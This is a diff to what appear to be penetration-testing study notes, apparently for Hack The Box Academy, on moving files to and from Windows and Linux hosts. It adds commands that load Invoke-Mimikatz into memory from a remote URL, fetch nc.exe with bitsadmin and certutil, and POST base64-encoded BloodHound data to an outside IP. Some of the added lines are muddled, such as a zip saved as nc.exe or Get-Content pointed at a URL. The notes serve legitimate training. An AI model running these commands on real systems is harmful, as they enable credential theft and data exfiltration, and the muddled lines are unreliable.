@@ -393,22 +393,47 @@ curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Conte
 ## Transferring Files 	
 
 * Download a file with PowerShell
-> Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1	Download a file with PowerShell
+The aliases iwr, curl, and wget can be used instead of Invoke-WebRequest
 > (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1',"C:\Users\Public\Downloads\PowerView.ps1")
-*
-> 
+> Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
+
+Instead of downloading to disk, the payload can instead be executed in memory, using Invoke-Expression, or the alias iex.
+> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+> Invoke-WebRequest https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 | iex
+
+* Upload a file with PowerShell
+> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'c:/users/public/downloads/BloodHound.zip' -Encoding Byte))
+> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
+> echo <base64> | base64 -d -w 0 > bloodhound.zip
+
+
+*Download a file using Bitsadmin
+> bitsadmin /transfer n http://10.129.34.0/nc.exe C:\Temp\nc.exe	
+Download
+> Import-Module bitstransfer;Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"
+Upload
+> Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql
+
+* Download a file using Certutil
+> certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe	
 
 *
 > 
 
+
 *
 > 
 
 
-IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')	Execute a file in memory using PowerShell
-Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64	Upload a file with PowerShell
-bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe	Download a file using Bitsadmin
-certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe	Download a file using Certutil
+Invoke-WebRequest https://academy.hackthebox.eu/storage/modules/24/upload_win.zip -OutFile upload_win.zip
+(New-Object System.Net.WebClient).DownloadFile('https://academy.hackthebox.eu/storage/modules/24/upload_win.zip',"C:\Users\Public\Downloads\PowerView.ps1")
+10.129.34.0
+https://academy.hackthebox.eu/storage/modules/24/upload_win.zip
+$b64 = [System.convert]::ToBase64String((Get-Content -Path 'https://academy.hackthebox.eu/storage/modules/24/upload_win.zip' -Encoding Byte))
+Invoke-WebRequest -Uri http://10.129.34.0:443 -Method POST -Body $b64
+certutil.exe -verifyctl -split -f http://10.129.34.0/nc.exe	
+bitsadmin /transfer n https://academy.hackthebox.eu/storage/modules/24/upload_win.zip C:\Temp\nc.exe
+
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh	Download a file using Wget
 curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh	Download a file using cURL
 php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'	Download a file using PHP
